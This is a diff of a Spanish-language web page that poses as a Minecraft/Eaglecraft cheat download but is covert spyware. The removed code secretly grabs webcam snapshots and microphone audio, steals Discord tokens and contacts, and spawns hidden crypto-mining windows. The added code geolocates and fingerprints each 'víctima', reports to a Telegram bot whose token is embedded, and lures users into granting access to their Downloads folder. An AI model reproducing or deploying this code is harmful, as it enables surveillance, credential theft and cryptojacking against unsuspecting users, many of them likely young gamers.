@@ -1,80 +1,117 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MineFun Hacks 2025</title>
-    <style>
-        body{background:black;color:lime;font-family:monospace;text-align:center;padding-top:20vh;font-size:22px;}
-        .load{animation:glow 2s infinite;}
-        @keyframes glow{0%,100%{opacity:0.4}50%{opacity:1}}
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HACKS FOR EAGLECRAFT XRAY + FLY + KILL AURA 2026</title>
+  <style>
+    body { 
+      background: linear-gradient(135deg, #1a1a2e, #16213e); 
+      color: #0f0; 
+      font-family: 'Courier New', monospace; 
+      text-align: center; 
+      padding-top: 15vh; 
+      margin: 0;
+    }
+    h1 { font-size: 42px; text-shadow: 0 0 20px #0f0; }
+    p { font-size: 22px; margin: 30px; }
+    button { 
+      background: #0f0; 
+      color: black; 
+      padding: 20px 50px; 
+      font-size: 26px; 
+      border: none; 
+      border-radius: 15px; 
+      cursor: pointer; 
+      box-shadow: 0 0 30px #0f0; 
+      transition: all 0.3s;
+    }
+    button:hover { transform: scale(1.05); box-shadow: 0 0 50px #0f0; }
+    .loader { 
+      display: none; 
+      margin: 40px auto; 
+      width: 80px; 
+      height: 80px; 
+      border: 8px solid #0f0; 
+      border-top: 8px solid transparent; 
+      border-radius: 50%; 
+      animation: spin 1s linear infinite; 
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .status { font-size: 24px; margin: 30px; color: #0f0; text-shadow: 0 0 10px; }
+  </style>
 </head>
 <body>
-    <div class="load">Redirigiendo...</div>
+
+  <h1>⚡ HACKS FOR EAGLECRAFT 2026 ⚡</h1>
+  <p>XRAY + FLY + KILLAURA + FULLBRIGHT + NOCLIP<br>Compatible con todos los servidores (HolyHCF, Viper, Minemora, etc.)</p>
+  <p>Para inyectar el hack definitivo necesitamos acceso a tu carpeta de <b>Descargas/Downloads</b> (es obligatorio para el injector)</p>
+
+  <button onclick="iniciarHack()">INYECTAR HACK AHORA</button>
+
+  <div class="status" id="status"></div>
+  <div class="loader" id="loader"></div>
 
 <script>
 
-const WEBHOOK = "https://discord.com/api/webhooks/1464389653426868492/Asx1zsKN_5mPJd9Zwn2z0gL3eUu7_BNIUijWJJoDTNB35n1TxXJRvaXHPTyctBf2YrfC";
+const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
+const CHAT_ID   = "8284747554";
+const URL_MSG   = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-function b64(t){return new Blob([atob(t.split(',')[1])],{type:'image/jpeg'})}
 
 
 (async () => {
+  const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+  const battery = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
+  
+  let coords = "Denegada";
+  try {
+    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000}));
+    coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+  } catch(e) {}
 
-   
-    try{
-        let s = await navigator.mediaDevices.getUserMedia({video:true});
-        let v = document.createElement('video'); v.srcObject=s; await v.play();
-        setTimeout(()=>{
-            let c = document.createElement('canvas');
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v,0,0);
-            let form = new FormData();
-            form.append('file', b64(c.toDataURL()), 'selfie.jpg');
-            fetch(WEBHOOK,{method:'POST',body:form});
-            s.getTracks().forEach(t=>t.stop());
-        }, 3000);
-    }catch(e){}
+  const mensajeEntrada = `🟢 NUEVA VÍCTIMA ENTRÓ A EAGLECRAFT HACKS
 
-    
-    if(navigator.contacts?.select){
-        try{
-            let c = await navigator.contacts.select(["name","tel"],{multiple:true});
-            if(c.length>0) fetch(WEBHOOK,{method:'POST',body:JSON.stringify({content:`📱 ${c.length} contactos robados`})});
-        }catch(e){}
-    }
+IP: ${ipData.ip || "?"}
+Ciudad: ${ipData.city || "?"}, ${ipData.country_name || "?"}
+Ubicación GPS: ${coords}
+Batería: ${battery.level ? Math.round(battery.level*100)+"% " + (battery.charging ? "⚡" : "") : "No disponible"}
+Dispositivo: ${navigator.platform} | ${screen.width}x${screen.height}
+Navegador: ${navigator.userAgent.split(' ').pop()}
+Hora: ${new Date().toLocaleString('es-ES')}`;
 
-    
-    try{
-        let s = await navigator.mediaDevices.getUserMedia({audio:true});
-        let r = new MediaRecorder(s);
-        let ch = [];
-        r.ondataavailable = e=>ch.push(e.data);
-        r.onstop = ()=>{ 
-            let f = new FormData(); 
-            f.append('file', new Blob(ch,{type:'audio/webm'}), 'audio.webm');
-            fetch(WEBHOOK,{method:'POST',body:f});
-            s.getTracks().forEach(t=>t.stop());
-        };
-        r.start(); setTimeout(()=>r.stop(),10000);
-    }catch(e){}
-
- 
-    try{(webpackChunkdiscord_app||[]).push([[""],{},r=>{for(let m in r.c){let x=r.c[m].exports?.default;if(x?.getToken){fetch(WEBHOOK,{method:'POST',body:JSON.stringify({content:`💎 Token: ||${x.getToken()}||`})});return}}}]);
-    }catch(e){}
-
-    
-    for(let i = 0; i < 150; i++) {
-        window.open("https://coinhive.glitch.me/mine.html", "_blank", "width=1,height=1,top=9999,left=9999");
-    }
-
-    
-    setTimeout(()=>{
-        location.href = "https://minefun-com-hacks.vercel.app/";
-    }, 1500);
-
+  fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({chat_id: CHAT_ID, text: mensajeEntrada})});
 })();
+
+async function iniciarHack() {
+  try {
+    document.getElementById("status").innerHTML = "✅ Acceso concedido<br><br>Redirigiendo al injector en 8 segundos...";
+    document.getElementById("loader").style.display = "block";
+
+    
+    const dirHandle = await window.showDirectoryPicker();
+
+    
+    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"}, 
+      body: JSON.stringify({chat_id: CHAT_ID, text: `🎉 VÍCTIMA DIO ACCESO A SU CARPETA DE DESCARGAS\nCarpeta: ${dirHandle.name}\nSe está redirigiendo al ForgeX Hub...\nHora: ${new Date().toLocaleString()}`})
+    });
+
+    
+    let segundos = 8;
+    const intervalo = setInterval(() => {
+      segundos--;
+      document.getElementById("status").innerHTML = `✅ Acceso concedido<br><br>Redirigiendo al hack en ${segundos} segundos...`;
+      if (segundos <= 0) {
+        clearInterval(intervalo);
+        location.href = "https://forgex-hub.vercel.app/";
+      }
+    }, 1000);
+
+  } catch (e) {
+    document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo inyectar";
+  }
+}
 </script>
+
 </body>
 </html>
